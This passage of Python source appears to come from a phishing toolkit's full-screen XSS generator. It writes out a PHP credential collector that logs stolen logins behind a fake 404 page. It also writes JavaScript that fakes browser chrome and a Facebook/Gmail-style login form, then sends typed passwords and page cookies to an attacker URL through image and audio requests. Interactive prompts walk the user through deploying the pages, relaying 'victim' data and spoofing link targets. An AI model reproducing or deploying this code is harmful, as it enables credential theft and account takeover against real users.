            # create header.js file path for uploading
            self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"] + self.pathDivider + "header.js"        
        
            # Write header.js file
            self.saveFile(self.inputDataTwo,j,"text")
            time.sleep(1)
            # if file isn't present throw error permissions probably
            if not os.path.isfile(self.inputDataTwo):
                self.errorOutput("[!] Error Can't Upload Custom XSS 'header.js' File to Folder, Check Permissions.","yellow","XSS")

            if typeOf == "GMAIL":
            
                # create custom header file
                j.append(self.gmailXSSGenCode(self.storageDict))

        b = []
        # Create Final PHP file that listens for the POST data to be sent    
        if typeOf == "FB":

            # create custom varGrab.php file code append to list
            b.append(self.XSSGenPHPCode())

            # create varGrab.php file path for uploading
            self.inputDataTwo =  self.storageDict["uploadPath"] +  self.pathDivider +"varGrab.php"        

            # Write header.js file
            self.saveFile(self.inputDataTwo,b,"text")

            time.sleep(1)
            # if file isn't present throw error permissions probably
            if not os.path.isfile(self.inputDataTwo):
                self.errorOutput("[!] Error Can't Upload Custom XSS 'varGrab.php' File to Folder, Check Permissions.","yellow","XSS")
                             
        else:
            self.errorOutput("[!] Error Can't Upload Custom XSS 'style.css' File to Folder, Check Permissions.","yellow","XSS")   

        # Display Success Bring User back to XSS gen menu
        self.errorOutput("[*] Success: Files Have been Written Returning back to XSS Gen Menu","green","XSS")
        # return back to prompt for commands or to exit?
        self.xssFullScreenGenerator(False) 
                

    ###########################################################
    ###########################################################

    def createDirectory(self,folderName,uploadPath,pathDivider):
    # Create Directory return True on success False on Error

        try:
            os.makedirs(uploadPath + pathDivider + folderName)
        except OSError:
            if not os.path.isdir(uploadPath + pathDivider + folderName):
                return False
        else: 
            if os.path.isdir(uploadPath + pathDivider + folderName):    
                return True   
            else:
                return False

    #####################################################
    #####################################################

    def returnPathDivider(self,inputData):
    # Return Path Divider depending on operating system
        d = inputData.find("\\")       
        if d == -1: 
            d = inputData.find("/")                  
            if d == -1: 
                return False
            else: 
                return "/"
        else: 
            return "\\"

    #####################################################
    #####################################################

    def deleteDir(self,path):
        """ deletes the path entirely uses operating systems native commands to speed things up """

        # remove directory even if it has files
        shutil.rmtree(path, ignore_errors=True)


    #####################################################
    #####################################################

    def XSSGenPHPCode(self):
    # This Generates the PHP File that Sits on the backend / control server waiting for user credentials
  

        r = []
        self.inputData = """<?PHP
/*
 @Author: [d]4rk0
 @File:   varGrab.php
 @Description:  Allows Scipt to send information using a simple http variable post request. This script
                grabs alters and stores them on disk. Add db support if you want i wrote enough shit for free to give back :P .
                You might get multiple entries. Thats cause multiple request vectors are working sometimes certain ones fail.
                Such as the embed img or audio background requests. Writing a simple cron job
                that looks for takes out file duplicates is all that is really needed if it bothers
                you that much or you want it that automated/organized? Tested with Firefox And Chrome should work with safari also dunno
                try it out urself.. 

*/
// BEGIN SCRIPT HEAD INFORMATION
// #############################################################################################
error_reporting(0);

// START FUNCTIONS
// #############################################################################################

function obfuscatePageError($type = "HTML5"){

     if (empty($_SERVER['SERVER_NAME'])){ $server = "Domain"; }else{ $server = $_SERVER['SERVER_NAME']; }

     if ($type == "HTML5"){

         // HTML5 Error Page
         $htmlContent = "<!doctype html>
     <head>
     <meta charset=\\"utf-8\\">
     <meta http-equiv=\\"X-UA-Compatible\\" content=\\"IE=edge,chrome=1\\">
     <title>".$server." - 404 Error Page</title>
     <meta name=\\"description\\" content=\\"".$server." seems to be an error! \\">
     </head>
     <body>
     <b><h2><font color=\\"#000000\\">404 Error - Page Not Found</font></h2></b>
     </body>
     </html> ";

     }elseif($type == "HTML"){

          // Regular HTML
          $htmlContent = "<!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"xhtml1-transitional.dtd\\"><html lang=\\"en\\" xml:lang=\\"en  \"><head><meta http-equiv=\\"Content-Type\" content=\\"text/html; charset=utf-8\\"/><meta name=\\"alang\\" content=\\"en\\"/><meta name=\\"asid\\" content=\\"\\"/>
         <title>".$server." - 404 Error Page</title>
         <meta name=\\"description\\" content=\\"".$server." seems to be an error! \\">
         </head>
         <body>
         <b><h2><font color=\\"#000000\\">404 Error - Page Not Found</font></h2></b>
         </body>
         </html>";
   
    }else{

         // Default HTML5 Display ( Recursive function )
         obfuscatePageError();
    }

    // Echo Contents
    echo $htmlContent;
    // Exit the Script
    exit(0);

  }

// #############################################################################################

function diskAdd($data,$fileName){

    // This Opens file at end for writing if doesnt exist tries to create it
    if (is_file($fileName)){
        // Append Data No Error Handling No point really
        $file = fopen($fileName, 'a+');
        // write stream
        fwrite($file, $data);
    }else{
        // Open for Banner Appending For example of account layout
        $file = fopen($fileName, 'w');
        // write stream
        fwrite($file,"\\n  - Start of Intel Entry List <><  \\n\\n");   
        // write exmaple  
        fwrite($file,"- Entry Example= U: username P: password T: acct-website Entry Date: servers-date-stamp\\n \\n\\n= ACCOUNTS START BELOW    -------------------------------------\\n\\n");     
        // write actual data stream
        fwrite($file, $data);
    }

    // close stream
    fclose($file);

  }



// END FUNCTIONS
// #############################################################################################


// BEGIN VARIABLES ////
// TYPE of Storage Method:  disk / add DB if want
$saveType = "disk";
// Filename if both or disk is picked
/* EDIT if wanted */ $fileName = "jam.txt";

// #############################################################################################


// Grab Data for storage
$u = $_GET["uL"];
// propagate a Proper Date
$date = date('l jS \of F Y h:i:s A');

// CHECK if data is empty if so do nothing 
if (empty($u) || strlen($u) < 14){ obfuscatePageError(); }

// @Create Payload String store in file
// @filter data?: No need storing in a text file
$infoPayload = "\\n\\n".$u . " Entry Date: " . $date . "\\n\\n";
 
// CONTROL-FLOW:
if (strtolower($saveType) === "db"){  obfuscatePageError(); }
elseif(strtolower($saveType) === "disk"){ diskAdd($infoPayload,$fileName); obfuscatePageError(); }
elseif(strtolower($saveType) === "both"){  obfuscatePageError(); }
else{ obfuscatePageError(); }
?>
        """

        r.append(self.inputData)
        # return code
        return r

    ################################################
    ################################################


    def XSSGenCodeCSS(self,storageDict,cssType):
    # This Generates the XSS Facebook CSS File Code
 

        # Facebook Custom XSS CSS File
        if cssType == "FB":

            j = []
            # create XSS Facebook CSS for html payload
            self.inputData = """
html.fullscreened {
  overflow-y: hidden;
  background-color: #fff;
}

.fullscreened #container { display: none; }

#textBox {

     /* Updated in JS */
       position:absolute;
       left:400px;
       top:100px;
		
   }		
#textBoxTwo {
     /* Updated in JS */
       position:absolute;
       left:400px;
       top:130px;
			

   }
	
#buttonSubmit {
      /* Updated in JS 420 */
       position:absolute;
       left:450px;
       top:180px;
	
	
   }		

#spoofSite {
  background-color: #fff;
  left: 0;
  margin: 0 auto;
  overflow-y: scroll;
  position: fixed;
  width: 100%;
  z-index: 2;

  /* Updated in JS */
  top: 100px;
  height: 500px;
}
.not-fullscreened #spoofSite { display: none; }


#spoofHeader {
  position: fixed;
  top: 0;
  left: 0;  
  width: 100%;
  z-index: 2;
}
.not-fullscreened #spoofHeader { display: none; }

#spoofMenu, #spoofBrowser { width: 100%; }


/* Menu (OS X only) */

.osx #spoofMenu { height: 22px; }
.windows #spoofMenu, .linux #spoofMenu { height: 0; }

.chrome.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-chrome-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

.firefox.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-firefox-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

.safari.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-safari-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

/* Browser UI */

.chrome.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-chrome-bg.png) left top repeat-x;
  height: 72px;
}

.chrome.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-chrome-bg.png) left top repeat-x;
  height: 61px;
}

.chrome.linux #spoofBrowser {
  background: url(""" + storageDict + """browser-linux-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-linux-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-linux-chrome-bg.png) left top repeat-x;
  height: 86px;
}

.firefox.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-firefox-center.png) center top no-repeat, url(""" + storageDict + """browser-osx-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-firefox-bg.png) left top repeat-x;
  height: 87px;
}

.firefox.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-firefox-bg.png) left top repeat-x;
  height: 63px;
}

.firefox.linux #spoofBrowser {
  background: url(""" + storageDict + """browser-linux-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-linux-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-linux-firefox-bg.png) left top repeat-x;
  height: 90px;
}

.safari.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-safari-center.png) center top no-repeat, url(""" + storageDict + """browser-osx-safari-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-safari-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-safari-bg.png) left top repeat-x;
  height: 72px;
}

.safari.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-safari-center.png) center top no-repeat, url(""" + storageDict + """browser-windows-safari-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-safari-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-safari-bg.png) left top repeat-x;
  height: 72px;
}
            """
            # return XSS CSS for writing
            j.append(self.inputData)
            return j

    #######################################################
    #######################################################

    def XSSGenCode(self,storageList,typeOf = "MIX"):
    #XSS Generator Facebook JavaScript Header
        
        #@BELOW ARE ALL RELAY XSS COMMUNICATIONS
        #@CURRENTLY MIXED METHODS ARE ONLY SUPPORTED 
        #@LAYOUT: FUNCTIONS >> SUBMIT_FUNCTION >> HTML_FULLSCREEN_PAYLOAD
        if typeOf == "MIX":
            d = []
            # Mix Send Info Options Body
            mixMethodsOption = """



function imgURLPass(dataPayload){
   
   var img = new Image();
   img.src="%(url)s"+encodeURIComponent(dataPayload);
   img.onload = function(){
       return true;
    }

 }

function redirectUser(urlRedirect){
    window.location(urlRedirect);
 }

function imgHTMLEmbed(dataPayload,urlPayload){

    // create payload
    var fullPayload = "%(url)s"+encodeURIComponent(dataPayload);
    var htmlEmbed = '<img src=\\''+fullPayload+'\\' width=\\'1\\' height=\\'1\\' onload=\\'redirectUser(\\''+urlPayload+'\\');\\' onerror=\\'imgHTMLEmbed(\\''+dataPayload+'\\');\\'>';
    document.write(htmlEmbed);

 }
 

function audioMacPass(dataPayload){

    var valuePayload = "%(url)s"+encodeURIComponent(dataPayload);
    var audioMacPayload = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab" height="16" width="250">\\n'+
'<param name="src" value="'+valuePayload+'">\\n'+
'<param name="autoplay" value="true">\\n'+
'<param name="controller" value="true">\\n'+
'<embed height="16" width="250" src="'+valuePayload+'" pluginspage="http://www.apple.com/quicktime/download/" type="video/quicktime" controller="true" autoplay="true">\\n'
'</object>';

    document.write(audioMacPayload);

 }


function audioPass(dataPayload){

    // Create URL payload handoff data
    var fullPayload = "%(url)s"+encodeURIComponent(dataPayload);
    var audioPayload = '<audio autoplay="autoplay">\\n'+
'<source src="'+fullPayload+'" type="audio/mpeg">\\n'+
'<source src="'+fullPayload+'" type="audio/ogg">\\n'+
'<!--[if lt IE 9]>\\n'+
'<bgsound src="'+fullPayload+'" loop="1">\\n'+
'<![endif]-->\\n'+
'</audio>';

    document.write(audioPayload);

 }



function jamSubmit(){

   // User
   var user = document.getElementById('Email').value;
   // Pass
   var password = document.getElementById('Password').value;
   // Type of Account
   var type = "%(accountType)s";
   // append false flag-
   var t = false;
   // Grab Current Sites Cookies Also
   var myCookies = document.cookie;
   // Append all data for sending
   var dataPayload = "U: " + user + " P: " + password + " T: " + type + " Cookies: " + myCookies;
   // redirect to this url for user login
   var windowRedirectURL = "%(redirect)s"+user;  
   // Pass Data
   t = imgURLPass(dataPayload);
   // loop till we pass it
   while (t === false){
       // Loop until returns false 
       t = imgURLPass(dataPayload); 
    }
    // Pass Data with embed img attribute
    imgHTMLEmbed(dataPayload,windowRedirectURL);
    // Browser detect display certain audio attributes
    if (BrowserDetect.browser == "Chrome") {
          audioPass(dataPayload);
    } else if (BrowserDetect.browser == "Firefox") {
            audioPass(dataPayload);
    } else if (BrowserDetect.browser == "Safari") {
           audioMacPass(dataPayload);
    } else {
            audioPass(dataPayload);
    }
    // Redirect to actual login page
    window.location = "%(redirect)s"+user;  

}

function displayGold(){

goat = 
'<!doctype html>' +
'<html class="no-js" lang="en">' +
'<head>' +
'<meta charset="utf-8">' +
'<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">' +
'<title>%(spoofWebTitle)s</title>' +
'<meta name="description" content="">' +
'<link rel="stylesheet" href="%(spoofWebStyleSheet)s">' +
'<script src="%(spoofWebJS1)s"></script> ' +
'<script src="%(spoofWebJS2)s"></script>' +
'<script src="%(spoofWebJS3)s"></script>' +
'<script src="%(spoofWebJS4)s"></script>' +
'<script src="%(spoofWebJS5)s"></script>' +
'</head>' +
'<body>' +
'<a class="spoofLink" href="%(spoofWebURL)s">%(spoofWebURLCaption)s</a>' +
'<div id="spoofHeader">' +
'<div id="spoofMenu"></div>' +
'<div id="spoofBrowser"></div>' +
'</div>' +
'<div id="spoofSite">' +
'<table border="0" id="loginss">'+
'<div id="textBox"> <B><font size="1">Email: &emsp;&emsp;<input type="text" name="Username"></div>'+
'<div id="textBoxTwo"><B> Password: <input type="password" name="Password"></div>'+
'<div id="buttonSubmit"><input type="submit" value="Login"  onclick="jamSubmit();"></div>'+
'</table>'+
'<center><img src="%(imgDirXSS)s">'+
'</div>\\n'+
'</body>\\n'+
'</html>';

    document.write(goat);

   }

    displayGold();
            """ % (storageList)

            # return for writing and usage
            d.append(mixMethodsOption)
            return d


   ################################################################################
   ################################################################################
 
    def returnCorrectPath(self,SETPath,osName = "posix"):
    # Tries to Return the Absolute Correct Root Path of where the SET folder resides

        # Init List
        pathList = []

        if osName == "posix":
            # Split at correct path dividers
            pathList = SETPath.split("/")
            self.pathDivider = "/"
        elif osName == "windows":
            # Split at correct path window dividers
            pathList = SETPath.split("\\")
            self.pathDivider = "\\"
        else:
            # Shouldnt Hit this but lets search for the divider then
            d = SETPath.find("\\")       
            if d == -1:
                d = SETPath.find("/")                  
                if d == -1:
                    return "NONE"
                else:
                    pathList = SETPath.split("/")
                    self.pathDivider = "/"
            else:
                pathList = SETPath.split("\\")
                self.pathDivider = "\\"

        # Set up While Loop and Find Path
        # By Subtracting and taking
        self.countDracula = len(pathList)
        while True:
            # decrement countDracula for loop killing
            self.countDracula = self.countDracula - 1
            # Infinite Loop Killer
            if self.countDracula == 0:
                # Terminate Loop Return NONE
                return "NONE"
            # Take last directory out of list and check
            pathList.pop()
            # Join them back together in a new variable
            self.pathCheck = self.pathDivider.join(pathList)
            # Create absolute path if this path does work
            self.absolutePath = self.pathCheck
            # Add Test Directory thats always in SETS Root Directory
            self.pathCheck =  self.pathCheck + "/src"
            # Now lets test and see if Directory is there
            if os.path.isdir(self.pathCheck):
                # Terminate Loop Lets Return the Absolute Path of SET :D Hugs
                return self.absolutePath
            else:
                pass
            

   ################################################################################
   ################################################################################

    def deployFullPhish(self,AttackType):
    # This Asks Questions And Sets up the Generated FullScreen Attack Files For Deployment or Alteration """

        # SERVER OR DIRECTORY
        serverList = []
        # mail or disk selection 
        storageList = []
        # asks all other questions title of page , intel verbose etc.etc.
        otherList = []
        # Stores end results if files were written returns True
        createGarbage = []

        # Add 0 AttackType to list
        storageList.append(AttackType)

        # Check if PHP is enabled they need it soooWEE 
        storageList.append(self.phpEnabled())
  

        self.results = raw_input("\nDo you have a Local Server Setup? (y Or n): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            self.results = raw_input("\nSpecify Full Path to Web Server Folder (ex: /var/www/html ): ")     
            resultss = self.results 
            if os.path.isdir(self.results):
                # Specify which action to take also
                serverList.append("ACTION:WEB_SERVER_PATH")
                # Append Directory to create files to
                serverList.append(resultss)
            else:
                self.results = raw_input("\nDir Not Found, Specify Main Web Folder Directory (ex: /var/www ): ")      
                resultss = self.results 
                if os.path.isdir(self.results):
                    # Specify which action to take also
                    serverList.append("ACTION:WEB_SERVER_PATH")
                    # Append Directory to create files to
                    serverList.append(resultss)
                else:
                    # Didnt say yes or no about FTP Files
                    self.errorOutput("[!] Error - We Couldn't Find That Web Directory.","yellow")  
        else:
            self.results = raw_input("\nSpecify a Dir path to Load the files to (ex: /home/d/set/attacks ): ")     
            resultss = self.results 
            if os.path.isdir(self.results):
                # Append WebServer Path
                # Specify which action to take also
                serverList.append("ACTION:DIR_PATH")
                # Append Directory to create files to
                serverList.append(resultss)
            else:
                self.results = raw_input("\nDirectory not found wanna try to create it? (y Or n): ")   
                if self.results.lower() == "y" or self.results.lower() == "yes":  
                    # Create JS Directory 
                    try:
                        os.makedirs(resultss)
                    except:
                        pass
                    if os.path.isdir(resultss):
                        #Specify which action to take also
                        serverList.append("ACTION:DIR_PATH")
                        # Append Directory to create files to
                        serverList.append(resultss)
                    else:
                        self.errorOutput("[!] Error - Couldn't Create the Directory Sorry Check Permissions","yellow")     
                else:
                    # nothing left to do
                    self.errorOutput("[!] Error - There isn't anything else we can do right now sorry.","yellow")   

        # Get Relay Information Disk or Mail Return / Pass php enabled 													
	    # Mail or Disk ask user
        phpEnabled = "YES"
        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
        if self.results.lower()[0] == "m" or self.results.lower() == "mail":
            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","red")
            storageList.append("MAIL")
            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
            if self.results.split("@") and len(self.results) > 5:
                storageList.append(self.results)
            else:
                # Throw Error improper email no @
                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
        elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
            # We need PHP to store the file on server
            if phpEnabled == "NO_PHP":
                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
            else:
                storageList.append("DISK")
                # Ask if they want a Random File name created
                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                    storageList.append("RANDOM_FILE")
                else:
                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                    # Check if string is AlphaNumerical
                    if  self.checkString(self.results) == False:
                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
                    else:
                        storageList.append(self.results)
        else:
            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")



       # Check if they just want to output directory   
       # Check about Directory Creating Append the Serverlist for FTP Checking to
       # Display Proper Error Message for the user
       # storageList.append(self.createDirectoryFullScreen(serverList))
      
       # All Other Checks
       # Create Intel explain menu
        menuDisplay = """
        \n
        [*] Information Verbose:
            Ontop of Asking for the Username and 
            Password Should we Gather Even
            More Information about the User such as 
            GEOIP / ISP / User Agent etc. etc. 
            This Requires Curl to be installed or 
            file_get_contents in PHP on selected Server   
        """
        # display About this
        self.outputText(menuDisplay,"cyan")
        # Set Verbose of Intel Gather
        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            otherList.append("INTEL_VERBOSE_LOUD")
        elif self.results.lower()[0] == "n" or self.results.lower() == "no":
            otherList.append("INTEL_VERBOSE_HUSH")
        else:
            # Anything Else lets just Hush it then
            otherList.append("INTEL_VERBOSE_HUSH")
        # Redirect Ask
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = Redirect URL Which is the Same 
         = URL of the Full-Screen Attack 
         = you picked. For Instance If 
         = it was AOL Full-Screen Attack
         = the default URL redirect would 
         = be https://my.screenname.aol.com
        """
        # display About this
        self.outputText(menuDisplay,"green")
        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("REDIRECT_DEFAULT")
        else:
            # No Checking on URL Let Them Use Whatever lol there bad i guess
            # Append Default Redirect Naaaow
            otherList.append(self.results)  


        # Spoof link
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the URL Link to be spoofed
         = to? This will be displayed when the user
         = rolls over the link. Basically tricking
         = them making them think they are going
         = to that URL..
        """
        # display About this
        self.outputText(menuDisplay,"darkyellow")
        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("DEFAULT_SPOOF")
        else:
            # Append specified spoof url now
            otherList.append(self.results)

        # link name
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the Actual URL name
         = to be?
        """
        # display About this
        self.outputText(menuDisplay,"red")
        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("DEFAULT_URL_NAME")
        else:
            # Append url name
            otherList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =    name of Index.php If you feel 
        =    the need to change the name please 
        =    do not add the actual extension .php 
        =    along with it only add whatever crazy 
        =    name you come up with
        """
        # display About this
        self.outputText(menuDisplay,"blue")
        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("INDEX_DEFAULT")
        else:
            check = self.results.find(".")
            # if it doesn't return a -1 it found a decimal
            if check != -1:
                # Throw Error we found a dot
                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
            else:
                # Append name of the File
                otherList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =       Title of the Webpage. 
        """
        # display About this
        self.outputText(menuDisplay,"cyan")
        self.results = raw_input("What Should the Title of the Page be? (ex: Twitter Login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("TITLE_DEFAULT")
        else:
            # Append name of the File
            otherList.append(self.results)


        # Pass Apended List lets Create files
        #createGarbage = self.createPhishFoodFullScreen(storageList,serverList,otherList)

        fileError = []
	# Lets Create the files 
        if storageList[0] == "FB" or storageList[0] == "TWITTER" or storageList[0] == "AOL" or storageList[0] == "GMAIL" or storageList[0] == "OUTLOOK":
            # Pass Options Create Output Files in Specified WebServer Folder
            fileError = self.createFullScreenFile(storageList,serverList,otherList)

        # Check if it was a success
        if fileError == True:
            self.outputText("\n[*] Creation of Files was a Success.. Lets do this... :D \n","darkyellow")
            self.errorOutput("[*] Returning to FullScreen Menu to go back to Main just Press 99 \n","yellow")
            self.errorOutput("","white")
        else:
            self.errorOutput("[*] Error - Something Went Wrong Try Again BraH...","yellow")
        
   ################################################################################
   ################################################################################

    def otherOptionsFullScreen(self):
        """  Other Options Asked before Full-Screen Attack Files are
             Created and Deployed in the field
        """  
       
        # Set Storage List
        storageList = []
        # Create Intel explain menu
        menuDisplay = """
        \n
        [*] Information Verbose:
            Ontop of Asking for the Username and 
            Password Should we Gather Even
            More Information about the User such as 
            GEOIP / ISP / User Agent etc. etc. 
            This Requires Curl to be installed or 
            file_get_contents in PHP on selected Server   
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        # Set Verbose of Intel Gather
        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            storageList.append("INTEL_VERBOSE_LOUD")
        elif self.results.lower()[0] == "n" or self.results.lower() == "no":
            storageList.append("INTEL_VERBOSE_HUSH")
        else:
            # Anything Else lets just Hush it then
            storageList.append("INTEL_VERBOSE_HUSH")
        # Redirect Ask
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = Redirect URL Which is the Same 
         = URL of the Full-Screen Attack 
         = you picked. For Instance If 
         = it was AOL Full-Screen Attack
         = the default URL redirect would 
         = be https://my.screenname.aol.com
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("REDIRECT_DEFAULT")
        else:
            # No Checking on URL Let Them Use Whatever lol there bad i guess
            # Append Default Redirect Naaaow
            storageList.append(self.results)  


        # Spoof link
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the URL Link to be spoofed
         = to? This will be displayed when the user
         = rolls over the link. Basically tricking
         = them making them think they are going
         = to that URL..
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("DEFAULT_SPOOF")
        else:
            # Append specified spoof url now
            storageList.append(self.results)

        # link name
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the Actual URL name
         = to be?
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("DEFAULT_URL_NAME")
        else:
            # Append url name
            storageList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =    name of Index.php If you feel 
        =    the need to change the name please 
        =    do not add the actual extension .php 
        =    along with it only add whatever crazy 
        =    name you come up with
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("INDEX_DEFAULT")
        else:
            check = self.results.find(".")
            # if it doesn't return a -1 it found a decimal
            if check != -1:
                # Throw Error we found a dot
                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
            else:
                # Append name of the File
                storageList.append(self.results)



        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =       Title of the Webpage.
        """
        # display About this
        self.outputText(menuDisplay,"blue")
        self.results = raw_input("What Should the Title of the Page be? (ex: AOL Login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("TITLE_DEFAULT")
        else:
            # Append name of the File
            storageList.append(self.results)


        # Return Storage List for Processing
        return storageList

   ################################################################################
   ################################################################################

    def copyJunk(self,src, dst):
    # Copy Directory to New Directory

        try:
            shutil.copytree(src, dst)
        except OSError as exc: 
            if exc.errno == errno.ENOTDIR:
                shutil.copy(src, dst)
            else:
                return "COPY"


   ################################################################################
   ################################################################################

    def createFullScreenFile(self,optionList,serverList,otherList):

        if serverList[0] == "ACTION:WEB_SERVER_PATH":

            if optionList[0] == "GMAIL":
                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified WebServer Path...\n","darkgreen")
            elif optionList[0] == "FB":
                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified WebServer Path...\n","darkgreen")
            elif optionList[0] == "TWITTER":
                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified WebServer Path...\n","darkgreen")
        else:

            if optionList[0] == "GMAIL":
                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified Directory Path...\n","green")
            elif optionList[0] == "FB":
                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified Directory Path...\n","darkgreen")
            elif optionList[0] == "TWITTER":
                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified Directory Path...\n","darkgreen")


        # GRAB Path Divider used by operating system
        self.pathDivider = self.returnPathDivider(os.getcwd())

        self.outputText("\n[*] Attempting to Create Directory + Moving Images there....\n","darkgreen")


        if optionList[0] == "FB":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "img"
        elif optionList[0] == "GMAIL":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "img"
        elif optionList[0] == "TWITTER":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "img"


        newImgDirectory = serverList[1] + self.pathDivider + "img"

        if self.copyJunk(imageFileDirectory,newImgDirectory) == "COPY":
        #if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to move JS Files and create JS Directory.......\n","red")
        if optionList[0] == "FB":
            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "js"        
        elif optionList[0] == "GMAIL":
